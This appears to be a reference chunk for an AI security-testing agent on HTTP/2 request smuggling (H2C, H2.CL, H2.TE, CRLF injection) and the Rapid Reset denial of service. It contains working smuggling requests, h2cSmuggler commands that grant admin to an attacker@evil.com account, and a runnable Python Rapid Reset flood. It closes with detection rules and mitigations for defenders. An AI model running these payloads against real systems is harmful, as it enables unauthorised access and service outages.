# HTTP/2 Smuggling & Desync Attacks — Agent Chunk 73a
> Source: PortSwigger Research, Bishop Fox H2C Research, Assetnote H2C Analysis, CVE-2023-44487 Rapid Reset Disclosure
> Purpose: Understand HTTP/2-specific request smuggling techniques including H2C smuggling, H2.CL/H2.TE desync, and HTTP/2 Rapid Reset DoS, with practical exploitation tools and methodology
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Test HTTP/2-enabled targets for H2C upgrade smuggling against reverse proxies, H2.CL and H2.TE desync against HTTP/2-to-HTTP/1.1 downgrade proxies, and Rapid Reset vulnerability. Use h2cSmuggler for H2C testing, Burp Suite with HTTP/2 support for desync, and http2smugl or turbo-intruder for advanced exploitation. Always check if the frontend supports HTTP/2 but proxies to HTTP/1.1 backends — this translation layer is where smuggling occurs.

---

## 1. H2C Smuggling

### 1.1 Background

H2C (HTTP/2 Cleartext) is the unencrypted variant of HTTP/2, initiated via an HTTP/1.1 `Upgrade: h2c` header. Many reverse proxies (Nginx, HAProxy, AWS ALB) do not understand or block H2C upgrades, forwarding the upgrade request to backends that do support it.

**Research:** Bishop Fox (Jake Miller, 2020) and Assetnote (Shubham Shah, 2021) independently demonstrated that H2C smuggling allows an attacker to bypass reverse proxy access controls entirely.

### 1.2 How H2C Smuggling Works

```
Client → Reverse Proxy → Backend

1. Client sends HTTP/1.1 request with Upgrade: h2c
2. Reverse proxy does not understand h2c; forwards request as-is
3. Backend accepts the upgrade, switches to HTTP/2
4. Client now speaks HTTP/2 directly to backend
5. Reverse proxy is BLIND — it sees only the initial upgrade as HTTP/1.1
6. All subsequent HTTP/2 frames bypass proxy ACLs, WAF, auth, rate limiting
```

### 1.3 Exploitation with h2cSmuggler

```bash
# Install h2cSmuggler
git clone https://github.com/BishopFox/h2cSmuggler.git
cd h2cSmuggler

# Basic scan — check if target is vulnerable
python3 h2cSmuggler.py -x https://target.com/ --test

# Smuggle request to internal endpoint
python3 h2cSmuggler.py -x https://target.com/ \
  -X GET \
  -u http://target.com/admin/internal/secrets

# Smuggle POST with body
python3 h2cSmuggler.py -x https://target.com/ \
  -X POST \
  -u http://target.com/admin/users \
  -d '{"role": "admin", "email": "attacker@evil.com"}' \
  -H "Content-Type: application/json"

# Access internal services via SSRF-like behavior
python3 h2cSmuggler.py -x https://target.com/ \
  -X GET \
  -u http://internal-service.local:8080/metrics
```

### 1.4 Manual H2C Upgrade

```bash
# Send H2C upgrade via curl
curl -v --http2 \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA" \
  -H "Connection: Upgrade, HTTP2-Settings" \
  https://target.com/

# If response includes "101 Switching Protocols", target upgraded to H2C
# The reverse proxy is now bypassed for all subsequent requests on this connection
```

### 1.5 Vulnerable Proxy Configurations

```nginx
# Nginx — VULNERABLE: forwards Upgrade header
location / {
    proxy_pass http://backend:8080;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
}

# Nginx — SAFE: does not forward Upgrade for non-websocket
location / {
    proxy_pass http://backend:8080;
    proxy_set_header Connection "";
    # Upgrade header stripped
}
```

## 2. H2.CL Desync (HTTP/2 Content-Length Smuggling)

### 2.1 The Attack

When an HTTP/2 frontend proxies to an HTTP/1.1 backend, it must translate HTTP/2 frames into HTTP/1.1 requests. HTTP/2 determines message boundaries by frame length, not headers. If the proxy passes the `content-length` header from the HTTP/2 request to the HTTP/1.1 backend without validating it against the actual frame data length, desync occurs.

```
# HTTP/2 request (frame-delimited — CL is metadata, not authoritative)
:method = POST
:path = /search
content-length: 0          ← Lies about body length

ACTUAL BODY (sent in DATA frame):
GET /admin HTTP/1.1
Host: target.com

```

### 2.2 PortSwigger Reproduction

```
# Front-end (HTTP/2): Reads body from DATA frames, ignores CL
# Back-end (HTTP/1.1): Uses CL: 0, treats body as next request

# Step 1: Send HTTP/2 POST with CL: 0 and smuggled request in body
POST /search HTTP/2
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: x

# Step 2: Back-end processes:
#   Request 1: POST /search (CL: 0, empty body)
#   Request 2: GET /admin (smuggled — from the "body" of request 1)
```

### 2.3 Burp Suite HTTP/2 Testing

```
# In Burp Repeater:
# 1. Enable HTTP/2 (Inspector panel → Protocol → HTTP/2)
# 2. Set Content-Length to 0
# 3. Add smuggled request in body
# 4. Disable "Update Content-Length" in Repeater settings
# 5. Send and observe if smuggled request is processed
```

## 3. H2.TE Desync (HTTP/2 Transfer-Encoding Smuggling)

### 3.1 The Attack

HTTP/2 does not have a `transfer-encoding` mechanism — framing is built into the protocol. However, if the frontend proxy passes a `transfer-encoding: chunked` header to the HTTP/1.1 backend, the backend uses chunked decoding while the frontend used frame-based decoding.

```
# HTTP/2 request
:method = POST
:path = /api/search
transfer-encoding: chunked      ← Invalid in HTTP/2 but forwarded

0\r\n
\r\n
GET /admin/secrets HTTP/1.1\r\n
Host: target.com\r\n
\r\n
```

### 3.2 Exploitation

```
# Front-end (HTTP/2): Ignores TE, reads full DATA frame as body
# Back-end (HTTP/1.1): Uses TE: chunked

# Backend sees:
#   Request 1: POST /api/search with chunked body "0\r\n\r\n" (empty)
#   Request 2: GET /admin/secrets (smuggled)
```

### 3.3 CRLF Injection Variant

```
# HTTP/2 allows header values with \r\n via binary encoding
# Inject headers into the translated HTTP/1.1 request

:method = GET
:path = /api
foo: bar\r\nTransfer-Encoding: chunked

# Translated to HTTP/1.1:
GET /api HTTP/1.1
Foo: bar
Transfer-Encoding: chunked
```

## 4. HTTP/2 Rapid Reset — CVE-2023-44487

### 4.1 Vulnerability (CVSS 7.5)

Discovered in October 2023, HTTP/2 Rapid Reset exploits the RST_STREAM frame to cancel requests immediately after sending them. The server allocates resources to process each request, but the RST_STREAM cancellation does not free those resources immediately.

**Record:** 398 million requests per second against Google infrastructure.

### 4.2 Attack Mechanism

```
# Normal HTTP/2 flow:
Client → HEADERS frame (stream 1) → Server processes → HEADERS response → DATA response

# Rapid Reset:
Client → HEADERS (stream 1) → RST_STREAM (stream 1)    ← Cancel immediately
Client → HEADERS (stream 3) → RST_STREAM (stream 3)    ← Cancel immediately
Client → HEADERS (stream 5) → RST_STREAM (stream 5)    ← Cancel immediately
... repeat at wire speed

# Server behavior:
# 1. Receives HEADERS → allocates memory, starts processing
# 2. Receives RST_STREAM → cancels response, but processing may continue
# 3. Resources accumulate faster than they are freed
# 4. Server exhausts memory/CPU → DoS
```

### 4.3 Key Properties

- Bypasses HTTP/2 `MAX_CONCURRENT_STREAMS` limit because RST_STREAM "closes" the stream, freeing the concurrency slot but not the processing resources.
- A single TCP connection can generate thousands of requests per second.
- No valid response is ever produced, so response-based rate limiters are not triggered.

### 4.4 Reproduction

```python
# Conceptual Python reproduction using h2 library
import h2.connection
import h2.config
import socket
import ssl

sock = socket.create_connection(('target.com', 443))
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
sock = ctx.wrap_socket(sock, server_hostname='target.com')

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

stream_id = 1
for i in range(100000):
    # Send request
    conn.send_headers(stream_id, [
        (':method', 'GET'),
        (':path', '/'),
        (':authority', 'target.com'),
        (':scheme', 'https'),
    ])
    # Immediately reset
    conn.reset_stream(stream_id)
    stream_id += 2
    
    if i % 100 == 0:
        sock.sendall(conn.data_to_send())
```

## 5. Tools Reference

### 5.1 Burp Suite HTTP/2

- Enable HTTP/2 in Project Settings > HTTP > HTTP/2
- Repeater supports HTTP/2 with manual header editing
- Scanner detects H2.CL and H2.TE desync automatically (Professional only)

### 5.2 http2smugl

```bash
# Rust-based HTTP/2 smuggling scanner
cargo install http2smugl

# Detect H2.CL
http2smugl detect --url https://target.com/ --type cl

# Detect H2.TE
http2smugl detect --url https://target.com/ --type te
```

### 5.3 turbo-intruder (Burp Extension)

```python
# turbo-intruder script for HTTP/2 single-packet attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False,
                          engine=Engine.HTTP2)
    
    for i in range(100):
        engine.queue(target.req, gate='race1')
    
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

## 6. Detection

```yaml
# Detect H2C upgrade attempts
- rule: H2C Upgrade Smuggling Attempt
  condition: http.request.headers["upgrade"] == "h2c"
  action: BLOCK
  severity: HIGH

# Detect Rapid Reset
- rule: HTTP/2 Rapid Reset
  condition: http2.rst_stream_rate > 100 per second per connection
  action: THROTTLE
  severity: CRITICAL
```

## 7. Mitigation

1. **Block H2C upgrades:** Strip `Upgrade: h2c` at the reverse proxy.
2. **Validate CL against frame length:** Reject HTTP/2 requests where `content-length` mismatches DATA frame size.
3. **Strip transfer-encoding from HTTP/2:** Drop TE headers before proxying to HTTP/1.1 backends.
4. **Rate-limit RST_STREAM:** Apply per-connection RST_STREAM frame rate limits (Nginx: `http2_max_requests`, Envoy: `max_requests_per_connection`).
5. **Update infrastructure:** Patch Nginx (1.25.3+), Apache (2.4.58+), Envoy (1.28+), Go (1.21.3+), Node (18.18.2+/20.9.0+) for Rapid Reset.
